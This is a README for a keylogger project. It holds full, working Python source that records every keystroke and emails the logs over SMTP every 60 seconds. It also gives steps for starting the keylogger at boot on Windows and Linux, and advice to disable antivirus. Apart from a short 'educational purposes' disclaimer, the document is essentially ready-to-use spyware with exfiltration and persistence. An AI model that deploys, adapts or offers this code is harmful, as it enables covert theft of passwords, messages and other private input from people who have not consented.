
## **Keylogger Project**

A **keylogger** is a program that records the keystrokes made by a user on a keyboard. This keylogger project is for **educational purposes** only and is designed to teach how keystroke logging works in cybersecurity.

### **Disclaimer**
This project is intended **only for educational purposes**. Unauthorized use of a keylogger on any device or network without permission is illegal.

---

### **Features**

- Captures all keystrokes entered by the user.
- Stores keystroke logs locally in a file.
- Sends keystroke logs via email (optional feature).
- Runs silently in the background.
- Option to run the keylogger at system startup.

---

### **How to Set Up and Use**

#### **1. Clone the Repository**

```bash
git clone https://github.com/your-username/keylogger-project.git
cd keylogger-project
```

#### **2. Install Requirements**

Make sure you have Python 3.x installed. Then, install the required libraries:

```bash
pip install pynput
```

#### **3. Run the Script**

```bash
python keylogger.py
```

---

### **Keylogger Script Overview**

#### **How It Works**

1. The script uses the `pynput` library to listen for keyboard events.
2. Every keystroke is recorded and appended to a log file.
3. (Optional) The log file can be sent to a specified email address at regular intervals.

---

### **Key Sections of the Code**

```python
import pynput
from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

# Function to write keystrokes to file
def write_to_file(key):
    with open(log_file, "a") as file:
        key = str(key).replace("'", "")
        if key == "Key.space":
            file.write(" ")
        elif key == "Key.enter":
            file.write("\n")
        elif key.startswith("Key."):
            file.write(f"[{key}]")
        else:
            file.write(key)

# Listener to capture key events
def on_press(key):
    write_to_file(key)

with Listener(on_press=on_press) as listener:
    listener.join()
```

---

### **Advanced Features**

1. **Email Sending**  
   Modify the script to send logs to an email address using the `smtplib` library.
   
2. **Running at System Startup**  
   You can configure the keylogger to run automatically when the system starts by adding it to the startup folder (on Windows) or creating a cron job (on Linux).

---

### **Contributing**

Contributions are welcome! If you have ideas to improve the keylogger or add more features, feel free to fork the repository and submit a pull request.

---

Here’s a full **keylogger Python script** with advanced features including **email sending** and **startup configuration**.

---

### **Keylogger Python Script**

```python
import os
import pynput
from pynput.keyboard import Key, Listener
import smtplib
from threading import Timer
from datetime import datetime

# Configuration
LOG_INTERVAL = 60  # Time in seconds to send logs via email
EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email
EMAIL_PASSWORD = "your_password"        # Replace with your password
LOG_FILE = "key_log.txt"
LOGS_FOLDER = "logs"

# Create logs folder if not exists
if not os.path.exists(LOGS_FOLDER):
    os.makedirs(LOGS_FOLDER)

# Function to write logs to a file
def write_to_file(key):
    with open(os.path.join(LOGS_FOLDER, LOG_FILE), "a") as file:
        key = str(key).replace("'", "")
        if key == "Key.space":
            file.write(" ")
        elif key == "Key.enter":
            file.write("\n")
        elif key.startswith("Key."):
            file.write(f"[{key}]")
        else:
            file.write(key)

# Email logs function
def send_logs_via_email():
    with open(os.path.join(LOGS_FOLDER, LOG_FILE), "r") as file:
        logs = file.read()
    
    if logs.strip():  # Only send if there's something logged
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, f"Subject: Keylogger Logs\n\n{logs}")
        server.quit()
    
    # Clear the log file after sending
    open(os.path.join(LOGS_FOLDER, LOG_FILE), "w").close()
    
    # Schedule the next email
    Timer(LOG_INTERVAL, send_logs_via_email).start()

# Listener to capture keystrokes
def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == Key.esc:
        return False  # Stop the listener when ESC is pressed

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start sending logs via email
    Timer(LOG_INTERVAL, send_logs_via_email).start()
    listener.join()
```

---

### **How It Works**

1. **Capturing Keystrokes**  
   The `pynput` library listens for key events (`on_press` and `on_release`). All keys are logged to the `key_log.txt` file.
   
2. **Sending Logs via Email**  
   Every 60 seconds (default value), the script sends the contents of the log file to the specified email. It then clears the log file to prepare for the next batch of logs.

3. **Running in the Background at Startup**  
   To make the keylogger run at startup:
   
   - **Windows**:  
     Create a shortcut of the Python script and place it in the Startup folder:  
     `C:\Users\<Your Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
   
   - **Linux**:  
     Add a cron job to execute the script at startup:
     ```bash
     crontab -e
     ```
     Add this line:
     ```bash
     @reboot python3 /path/to/your/keylogger.py
     ```

---

### **Important Notes**

1. **Email Configuration**  
   - You need to enable **"Allow less secure apps"** in your Gmail account settings or generate an **App Password** if you have 2FA enabled.  
   - Use a dedicated email for this, as keylogging is sensitive, and you don't want to compromise your primary email account.

2. **Antivirus Detection**  
   Many antivirus programs will detect keylogger scripts as malicious. This is normal because keyloggers can be used for malicious purposes. If you are testing this on your own system, disable your antivirus or add an exception.

---
